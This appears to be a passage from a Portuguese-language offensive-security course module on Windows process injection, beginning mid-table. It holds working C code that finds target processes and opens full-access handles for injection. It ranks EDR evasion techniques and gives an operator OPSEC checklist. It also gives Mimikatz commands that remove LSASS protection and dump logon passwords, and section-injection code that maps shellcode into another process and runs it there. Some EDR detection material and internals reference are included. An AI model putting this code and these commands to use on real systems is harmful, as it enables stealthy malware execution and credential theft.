| `NtQuerySystemInformation` | ntdll syscall | Menos hookada | Não direto | Qualquer | Melhor — syscall direto, evita Tlhelp32 hooks |

#### Método 1: Toolhelp32 (clássico, mais hookado)

```c
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <stdio.h>

void ListProcessesForTargeting() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    printf("%-10s %-30s %-15s\n", "PID", "Nome", "PPID");

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);

            printf("%-10d %-30ls %-15d",
                   pe32.th32ProcessID,
                   pe32.szExeFile,
                   pe32.th32ParentProcessID);

            if (hProc) {
                printf(" [acessivel]");
                CloseHandle(hProc);
            }
            printf("\n");

        } while (Process32NextW(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
}
```

#### Método 2: EnumProcesses (PSAPI)

Retorna array de PIDs. Para obter nome, abre handle (`OpenProcess`) → `EnumProcessModules` → `GetModuleBaseName`. **Vantagem** sobre Toolhelp: garante que processos com handle aberto são acessíveis para injeção (se OpenProcess falha = privilégios insuficientes, descartar alvo).

```c
#include <windows.h>
#include <psapi.h>
#include <stdio.h>

BOOL PrintProcesses() {
    DWORD   adwProcesses[1024 * 2];
    DWORD   dwReturnLen1 = 0, dwReturnLen2 = 0, dwNmbrOfPids = 0;
    HANDLE  hProcess = NULL;
    HMODULE hModule  = NULL;
    WCHAR   szProc[MAX_PATH];

    if (!EnumProcesses(adwProcesses, sizeof(adwProcesses), &dwReturnLen1)) {
        printf("[!] EnumProcesses Failed: %d\n", GetLastError());
        return FALSE;
    }

    dwNmbrOfPids = dwReturnLen1 / sizeof(DWORD);
    printf("[i] %d processes detected\n", dwNmbrOfPids);

    for (int i = 0; i < dwNmbrOfPids; i++) {
        if (adwProcesses[i] == 0) continue;

        if ((hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                                    FALSE, adwProcesses[i])) != NULL) {
            if (EnumProcessModules(hProcess, &hModule, sizeof(HMODULE), &dwReturnLen2)) {
                if (GetModuleBaseName(hProcess, hModule, szProc, sizeof(szProc)/sizeof(WCHAR))) {
                    wprintf(L"[%0.3d] %s - PID %d\n", i, szProc, adwProcesses[i]);
                }
            }
            CloseHandle(hProcess);
        }
    }
    return TRUE;
}
```

#### Variante: GetRemoteProcessHandle via EnumProcesses

Retorna handle pronto para uso em injection:

```c
BOOL GetRemoteProcessHandle(LPCWSTR szProcName, DWORD* pdwPid, HANDLE* phProcess) {
    DWORD adwProcesses[1024 * 2];
    DWORD dwReturnLen1 = 0, dwReturnLen2 = 0, dwNmbrOfPids = 0;
    HANDLE hProcess = NULL;
    HMODULE hModule = NULL;
    WCHAR szProc[MAX_PATH];

    if (!EnumProcesses(adwProcesses, sizeof(adwProcesses), &dwReturnLen1)) return FALSE;
    dwNmbrOfPids = dwReturnLen1 / sizeof(DWORD);

    for (int i = 0; i < dwNmbrOfPids; i++) {
        if (adwProcesses[i] == 0) continue;
        if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, adwProcesses[i])) != NULL) {
            if (EnumProcessModules(hProcess, &hModule, sizeof(HMODULE), &dwReturnLen2)) {
                if (GetModuleBaseName(hProcess, hModule, szProc, sizeof(szProc)/sizeof(WCHAR))) {
                    if (wcscmp(szProcName, szProc) == 0) {
                        wprintf(L"[+] FOUND \"%s\" - PID %d\n", szProc, adwProcesses[i]);
                        *pdwPid = adwProcesses[i];
                        *phProcess = hProcess;
                        return TRUE;
                    }
                }
            }
            CloseHandle(hProcess);
        }
    }
    return FALSE;
}
```

**Diferenciação de svchost.exe**: existem múltiplas instâncias de `svchost.exe` rodando em níveis de privilégio diferentes. Com Toolhelp não há como distinguir antes de tentar `OpenProcess`. Com EnumProcesses + handle, o OpenProcess falhar = sinal claro de processo de alta privilégio (não atacável).

#### Método 3: NtQuerySystemInformation (syscall stealth)

`NtQuerySystemInformation` é um **syscall** exportado por `ntdll.dll`. Mais difícil de hookar que APIs de userland em kernel32/psapi.

```c
// Function pointer typedef
typedef NTSTATUS (NTAPI* fnNtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID                    SystemInformation,
    ULONG                    SystemInformationLength,
    PULONG                   ReturnLength
);

// SYSTEM_PROCESS_INFORMATION (não totalmente documentada)
typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;        // offset para próximo elemento (ou 0 = fim)
    ULONG NumberOfThreads;
    BYTE Reserved1[48];
    UNICODE_STRING ImageName;     // ← nome do processo
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;       // ← PID
    PVOID Reserved2;
    ULONG HandleCount;
    ULONG SessionId;
    PVOID Reserved3;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG Reserved4;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    PVOID Reserved5;
    SIZE_T QuotaPagedPoolUsage;
    PVOID Reserved6;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER Reserved7[6];
} SYSTEM_PROCESS_INFORMATION;

BOOL GetRemoteProcessHandleNt(LPCWSTR szProcName, DWORD* pdwPid, HANDLE* phProcess) {
    fnNtQuerySystemInformation   pNtQuerySystemInformation = NULL;
    ULONG                        uReturnLen1 = 0, uReturnLen2 = 0;
    PSYSTEM_PROCESS_INFORMATION  SystemProcInfo = NULL;
    NTSTATUS                     STATUS = 0;
    PVOID                        pValueToFree = NULL;

    pNtQuerySystemInformation = (fnNtQuerySystemInformation)
        GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtQuerySystemInformation");
    if (pNtQuerySystemInformation == NULL) return FALSE;

    // Primeira chamada — só para obter tamanho do buffer necessário
    // Falha esperada com STATUS_INFO_LENGTH_MISMATCH (0xC0000004)
    pNtQuerySystemInformation(SystemProcessInformation, NULL, 0, &uReturnLen1);

    SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)
        HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
    if (SystemProcInfo == NULL) return FALSE;

    pValueToFree = SystemProcInfo;  // salvar para HeapFree

    // Segunda chamada — buffer correto
    STATUS = pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo,
                                       uReturnLen1, &uReturnLen2);
    if (STATUS != 0) {
        HeapFree(GetProcessHeap(), 0, pValueToFree);
        return FALSE;
    }

    // Walk através da linked-list de SYSTEM_PROCESS_INFORMATION
    while (TRUE) {
        if (SystemProcInfo->ImageName.Length &&
            wcscmp(SystemProcInfo->ImageName.Buffer, szProcName) == 0) {

            *pdwPid = HandleToULong(SystemProcInfo->UniqueProcessId);
            *phProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *pdwPid);
            HeapFree(GetProcessHeap(), 0, pValueToFree);
            return *phProcess != NULL;
        }

        if (SystemProcInfo->NextEntryOffset == 0) break;
        SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)
            ((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
    }

    HeapFree(GetProcessHeap(), 0, pValueToFree);
    return FALSE;
}
```

**Por que double-call**: na primeira chamada com buffer NULL/0, função falha com `STATUS_INFO_LENGTH_MISMATCH` mas escreve o tamanho necessário em `ReturnLength`. Padrão típico de funções NT que retornam structures de tamanho variável.

**Linked list traversal**: `SYSTEM_PROCESS_INFORMATION` é uma **linked list embedded em buffer linear** — cada entrada tem `NextEntryOffset` apontando para próxima. Última entrada tem `NextEntryOffset = 0`.

#### Qual Usar?

- **Stealth-first**: NtQuerySystemInformation — menos hooks userland
- **Implementação rápida**: EnumProcesses — handle retornado pronto para uso
- **Compat máxima (Windows antigo)**: Toolhelp32 — funciona desde Windows 95
- **Imprevisibilidade**: rotacionar entre métodos — diferentes builds usam diferentes APIs

---

## Detecção e OPSEC

### O Que EDRs Detectam

**1. Sequência clássica de APIs (API hooking)**
Todos os EDRs modernos hookeiam as seguintes APIs em userland via DLL injection no processo monitorado:
- `VirtualAllocEx` com `PAGE_EXECUTE_WRITECOPY` ou `PAGE_EXECUTE_READWRITE`
- `WriteProcessMemory` seguido de mudança de proteção para executável
- `CreateRemoteThread` com endereço em região não-imagem
- `NtCreateThreadEx` (versão NT de CreateRemoteThread)
- `OpenProcess` com `PROCESS_ALL_ACCESS` para processos críticos

**2. Análise de comportamento de thread**
Ferramentas como Get-InjectedThread (PSv5) detectam threads cuja stack ou start address não corresponde a nenhum módulo carregado:

```powershell
# https://github.com/jaredcatkinson/Get-InjectedThread
Import-Module .\Get-InjectedThread.ps1
Get-InjectedThread
```

**3. Indicadores de memória suspeita**
- Região `MEM_PRIVATE` executável sem módulo correspondente
- Thread com `StartAddress` em região `MEM_PRIVATE`
- Região `MEM_PRIVATE` com permissão `PAGE_EXECUTE_READWRITE`

### Técnicas de Evasão por Ordem de Eficácia

**Nível 1: Básico (evita detecção simples)**
- Usar `VirtualProtectEx` para mudar RW->RX ao invés de alocar RWX direto
- Usar `NtCreateThreadEx` ao invés de `CreateRemoteThread`
- Usar syscalls diretas ao invés de APIs de userland (evita hooks de EDR em userland)

**Nível 2: Intermediário**
- Module Stomping: escrever shellcode em região de DLL legítima já carregada
- Usar `NtMapViewOfSection` ao invés de `VirtualAllocEx` (região aparece como mapeada)
- Thread hijacking: modificar thread existente ao invés de criar nova

**Nível 3: Avançado**
- Syscalls diretas com SSN (System Service Numbers) dinâmicos (Hell's Gate, Halo's Gate)
- Indirect syscalls (via `syscall` em ntdll.dll para evitar detecção por stack)
- Kernel callbacks bypass via BYOVD (Bring Your Own Vulnerable Driver)

### OPSEC Checklist para Injeção de Processo

```
[ ] Processo alvo tem longevidade adequada para a operacao?
[ ] Processo alvo tem contexto de seguranca necessario?
[ ] Acesso ao processo requer SeDebugPrivilege? (aumenta suspeicao)
[ ] Tipo de memoria usada e MEM_IMAGE ou MEM_PRIVATE? (PRIVATE = mais suspeito)
[ ] Metodo de execucao e CreateRemoteThread? (muito detectado)
[ ] Handle aberto com direitos minimos necessarios?
[ ] Shellcode e position-independent e sem strings suspeitas?
[ ] Comportamento do shellcode (rede, disco) e consistente com o processo hospedeiro?
```

---

## Internals — EPROCESS, PEB, TEB, PPL

> Campos internos das estruturas de processo no kernel — essencial para entender o que ferramentas como Mimikatz manipulam e como EDRs e PPL protegem processos.

### EPROCESS — Campos Críticos (x64)

```
EPROCESS é o objeto de processo no kernel. Todo processo tem um EPROCESS na kernel pool.
WinDbg: dt nt!_EPROCESS <addr>

Campos relevantes para ofensiva:

Campo                  Offset (x64)  Relevância
──────────────────────────────────────────────────────────────────────
Pcb (KPROCESS)         +0x000        Cabeçalho de scheduler (CR3, threads)
UniqueProcessId        +0x2e0        PID
ActiveProcessLinks     +0x2e8        Lista duplamente encadeada de todos os processos
Token                  +0x4b8        EX_FAST_REF → token de segurança
ObjectTable            +0x570        HANDLE_TABLE* → tabela de handles abertos
Peb                    +0x550        PEB* (user-mode)
EThreadListHead        +0x5e0        Lista de threads do processo
Protection             +0x87a        PS_PROTECTION → nível PP/PPL (ver tabela abaixo)
SectionObject          +0x3c0        Section mapeada para a imagem
```

```
KPROCESS — campos de scheduler (dentro de EPROCESS +0x000):

DirectoryTableBase    → CR3 — ponteiro para page directory do processo
ThreadListHead        → Lista de KTHREAD neste processo
InstrumentationCallback → Hook por processo — usado por APTs para hook de syscalls
SecurePid             → PID no Secure Kernel (VTL 1) se Credential Guard ativo
```

### PEB — Process Environment Block

Acessível em user-mode sem syscall via `gs:[60h]` (x64).

```c
// Acesso assembly (shellcode)
mov rax, gs:[60h]          // ponteiro para PEB

// Campos relevantes:
PEB+0x010  ImageBaseAddress  → base da imagem EXE principal
PEB+0x018  Ldr (PEB_LDR_DATA*) → listas de módulos carregados
PEB+0x068  NtGlobalFlag      → 0x70 = processo está sendo debugado (anti-debug check)
PEB+0x0bc  SessionId         → sessão de Terminal Services
```

**PEB_LDR_DATA — Enumeração de Módulos sem API (Shellcode/PIC)**

Técnica clássica para encontrar kernel32/ntdll sem chamar GetProcAddress:

```asm
; x64 — InInitializationOrderModuleList (ntdll → kernel32 → kernelbase → ...)
mov rax, gs:[60h]          ; PEB
mov rax, [rax + 18h]       ; Ldr (PEB_LDR_DATA*)
mov rax, [rax + 30h]       ; InInitializationOrderModuleList.Flink

; Cada entry (LDR_DATA_TABLE_ENTRY):
;   +0x10 = DllBase (PVOID)
;   +0x18 = EntryPoint
;   +0x20 = SizeOfImage
;   +0x30 = BaseDllName (UNICODE_STRING)
;   +0x38 = FullDllName
```

### TEB — Thread Environment Block

Acessível em user-mode via `gs:[30h]` (x64) / `fs:[18h]` (x86).

```c
gs:[30h]  → ponteiro para o próprio TEB
gs:[60h]  → ponteiro para PEB (TEB+0x60)

// Campos relevantes:
TEB+0x000  NtTib.StackBase   → topo da stack da thread
TEB+0x008  NtTib.StackLimit  → limite da stack
TEB+0x038  NtTib.Self        → ponteiro para o próprio TEB
TEB+0x040  ClientId          → {ProcessId, ThreadId}
TEB+0x1480 TlsSlots[64]      → Thread Local Storage
```

### Protected Processes (PP) e PPL

PP/PPL é a razão pela qual SYSTEM não consegue abrir LSASS com `PROCESS_VM_READ`:

```
PS_PROTECTION (byte em EPROCESS+0x87a):
  bits [7:4] = SignerType (valor 0-7)
  bits [3:0] = Type (0=None, 1=PPL, 2=PP)

Níveis de assinatura (do mais alto para o mais baixo):
  7 = WinSystem    → System, Smss.exe
  6 = WinTcb       → Csrss.exe, Services.exe, Wininit.exe
  5 = Windows      → binários Windows assinados
  4 = Lsa          → Lsass.exe (se PPL ativo)
  3 = Antimalware  → EDR agents (CrowdStrike, Defender, etc.)
  2 = CodeGen      → .NET runtime
  1 = Authenticode → certificados comerciais
  0 = None         → processos normais

Regra de acesso:
  PP bloqueia PPL do mesmo nível ou inferior
  PPL bloqueia apenas PPL de nível INFERIOR
  Processo SYSTEM (None) não pode abrir LSASS com PROCESS_VM_READ se LSASS=PPL(4)
```

**Bypass:**
```cmd
:: Mimikatz + MimiDrv: remover flag de proteção diretamente no EPROCESS
mimikatz # !+                                        :: carregar driver mimidrv
mimikatz # !processprotect /process:lsass.exe /remove :: zera PS_PROTECTION byte
mimikatz # sekurlsa::logonpasswords                  :: agora funciona
```

### CreateRemoteThread — Fluxo Interno no Kernel

```
CreateRemoteThread (kernel32.dll)
  └─► CreateRemoteThreadEx (kernelbase.dll)
        └─► NtCreateThreadEx (ntdll.dll — stub de syscall)
              └─► [syscall] → kernel NtCreateThreadEx
                    └─► PspCreateThread (ps/psthread.c)
                          ├─► Aloca ETHREAD na kernel pool
                          ├─► Inicializa KTHREAD (stack, wait list, APC list)
                          ├─► Associa ao EPROCESS alvo
                          └─► Retorna HANDLE para caller

Access rights necessários no handle do processo alvo:
  PROCESS_CREATE_THREAD    (0x0002)
  PROCESS_QUERY_INFORMATION (0x0400)
  PROCESS_VM_OPERATION     (0x0008)
  PROCESS_VM_WRITE         (0x0020)
  PROCESS_VM_READ          (0x0010)
  OU: SeDebugPrivilege bypassa o access check
```

**Detecção por EDR via ThreadStartAddress:**
- Thread legítima: `ThreadStartAddress` aponta para função dentro de DLL mapeada (MEM_IMAGE)
- Thread injetada: `ThreadStartAddress` aponta para região MEM_PRIVATE ou DLL não assinada

---

## Section Injection — Técnica Sem WriteProcessMemory

Section objects permitem injeção sem chamar `WriteProcessMemory` — evita o IOC mais monitorado.

```c
// 1. Criar section anônima backed por page file
HANDLE hSection;
LARGE_INTEGER size = {shellcodeSize};
NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &size,
                PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

// 2. Mapear no processo ATUAL para escrever payload
PVOID localView = NULL;
SIZE_T viewSize = 0;
NtMapViewOfSection(hSection, GetCurrentProcess(), &localView, 0, 0,
                   NULL, &viewSize, ViewUnmap, 0, PAGE_READWRITE);
memcpy(localView, shellcode, shellcodeSize);  // escreve localmente

// 3. Mapear no processo ALVO (sem WriteProcessMemory)
PVOID remoteView = NULL;
NtMapViewOfSection(hSection, hTargetProcess, &remoteView, 0, 0,
                   NULL, &viewSize, ViewUnmap, 0, PAGE_EXECUTE_READ);

// 4. Criar thread no alvo apontando para remoteView
HANDLE hThread;
NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hTargetProcess,
                 remoteView, NULL, FALSE, 0, 0, 0, NULL);
```

**Por que é mais furtivo:**
- Sem `WriteProcessMemory` → sem IOC de ETW-TI `TASK_OS_WRITE_REMOTE`
- Região mapeada aparece como MEM_MAPPED (não MEM_PRIVATE) na VAD tree
- `NtMapViewOfSection` ainda gera ETW-TI `TASK_MAP_VIEW_REMOTE` — não invisível, mas diferente

---

## Módulos Relacionados

`02_tecnicas_classicas_e_avancadas.md` aprofunda em DLL Injection, Process Hollowing, Early Bird APC, Module Stomping com implementações. `03_post_exploitation_evasion_bof.md` cobre Fork & Run vs. In-Process, BOFs, Nanodump, execute-assembly evasion. `05_pe_format_e_parsing.md` cobre o formato PE necessário pra reflective loading. MITRE ATT&CK: T1055 (Process Injection), T1055.001 (DLL Injection), T1055.012 (Process Hollowing).

---

## Leitura Complementar

- Mark Russinovich — *Windows Internals* Part 1, Chapter 5 (Processes)
- *The Shellcoder's Handbook*
- Get-InjectedThread — https://github.com/jaredcatkinson/Get-InjectedThread
- Hunt-Sleeping-Beacons — https://github.com/thefLink/Hunt-Sleeping-Beacons
- Ferramenta: Moneta (https://github.com/forrest-orr/moneta) - detector de anomalias de memória
